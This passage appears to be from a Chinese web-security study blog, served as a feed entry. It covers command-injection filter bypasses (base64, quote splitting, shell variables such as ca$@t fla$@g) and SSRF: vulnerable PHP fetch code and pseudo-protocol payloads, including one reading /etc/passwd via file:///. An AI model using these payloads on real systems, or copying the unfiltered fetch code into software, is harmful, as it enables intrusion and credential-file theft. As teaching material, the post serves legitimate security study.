style="color: #82AAFF">echo</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Y2F0wqAK</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">|</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">base64</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-d</span></span></code></pre></div><h4 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h4><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">c</span><span style="color: #FFCB6B">&#39;&#39;</span><span style="color: #FFCB6B">t</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">flag</span><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #FFCB6B">ca</span><span style="color: #FFCB6B">&quot;&quot;</span><span style="color: #FFCB6B">t</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">flag</span></span></code></pre></div><h4 id="利用Shell-特殊变量绕过"><a href="#利用Shell-特殊变量绕过" class="headerlink" title="利用Shell 特殊变量绕过"></a>利用Shell 特殊变量绕过</h4><p>第一个参数是1，第二个参数是2。而参数不存在时其值为空</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">ca$@t</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">fla</span><span style="color: #BABED8">$</span><span style="color: #C3E88D">@g</span></span><span class="line"><span style="color: #FFCB6B">ca$1t</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">fla</span><span style="color: #BABED8">$2g</span></span></code></pre></div><h3 id="linux中查看文件内容"><a href="#linux中查看文件内容" class="headerlink" title="linux中查看文件内容"></a>linux中查看文件内容</h3><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">more:一页一页的显示档案内容</span></span><span class="line"><span style="color: #babed8">less:与 more 类似</span></span><span class="line"><span style="color: #babed8">head:查看头几行</span></span><span class="line"><span style="color: #babed8">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span></span><span class="line"><span style="color: #babed8">tail:查看尾几行</span></span><span class="line"><span style="color: #babed8">nl：显示的时候，顺便输出行号</span></span><span class="line"><span style="color: #babed8">od:以二进制的方式读取档案内容</span></span><span class="line"><span style="color: #babed8">vi:一种编辑器，这个也可以查看</span></span><span class="line"><span style="color: #babed8">vim:一种编辑器，这个也可以查看</span></span><span class="line"><span style="color: #babed8">sort:可以查看</span></span><span class="line"><span style="color: #babed8">uniq:可以查看</span></span><span class="line"><span style="color: #babed8">file -f:报错出具体内容</span></span></code></pre></div><h2 id="SSRF-–-服务器端请求伪造"><a href="#SSRF-–-服务器端请求伪造" class="headerlink" title="SSRF – 服务器端请求伪造"></a>SSRF – 服务器端请求伪造</h2><ul><li>SSRF 形成的原因大都是由于服务端提供了<strong>从其他服务器应用</strong>获取数据的功能且没有对目标地址做过滤与限制。</li></ul><h3 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h3><h4 id="漏洞产生场景"><a href="#漏洞产生场景" class="headerlink" title="漏洞产生场景"></a>漏洞产生场景</h4><ul><li><p>分享：通过URL地址分享网页内容</p></li><li><p>转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译:通过URL地址翻译对应文本的内容</p></li><li><p>图片、文章收藏功能</p></li><li><p>未公开的api实现以及其他调用URL的功能</p></li><li><p>图片加载与下载:通过URL地址加载或下载图片</p></li><li><p>从URL关键字中寻找, 利用google 语法加上这些关键字去寻找SSRF漏洞</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">share wap url link src source target u display sourceURl imageURL domain</span></span></code></pre></div></li></ul><h4 id="产生SSRF漏洞的函数"><a href="#产生SSRF漏洞的函数" class="headerlink" title="产生SSRF漏洞的函数"></a>产生SSRF漏洞的函数</h4><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h5><p>从指定url获取文件:</p><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">content </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">file_get_contents</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">url</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">]);</span><span style="color: #BABED8"> </span></span></code></pre></div><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span></span></code></pre></div><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">link </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">url</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">];</span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">curlobj </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">curl_init</span><span style="color: #89DDFF">();</span></span><span class="line"><span style="color: #82AAFF">curl_setopt</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">curlobj</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> CURLOPT_POST</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #82AAFF">curl_setopt</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">curlobj</span><span style="color: #89DDFF">,</span><span style="color: #BABED8">CURLOPT_URL</span><span style="color: #89DDFF">,$</span><span style="color: #BABED8">link</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #82AAFF">curl_setopt</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">curlobj</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> CURLOPT_RETURNTRANSFER</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">result</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">curl_exec</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">curlobj</span><span style="color: #89DDFF">);</span></span></code></pre></div><h3 id="SSRF中URL的伪协议"><a href="#SSRF中URL的伪协议" class="headerlink" title="SSRF中URL的伪协议"></a>SSRF中URL的伪协议</h3><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，xxxxxx.com&#x2F;index.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议, url&#x3D;ldap:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aqui<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用<strong>gopherus</strong>生成payload</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEB攻防-通用漏洞&quot;&gt;&lt;a href=&quot;#WEB攻防-通用漏洞&quot; class=&quot;headerlink&quot; title=&quot;WEB攻防-通用漏洞&quot;&gt;&lt;/a&gt;WEB攻防-通用漏洞&lt;/h1&gt;&lt;p&gt;大型靶场&lt;a href=&quot;https://vulhub.org/#/envi</summary>
      
    
    
    
    
  </entry>
  
</feed>
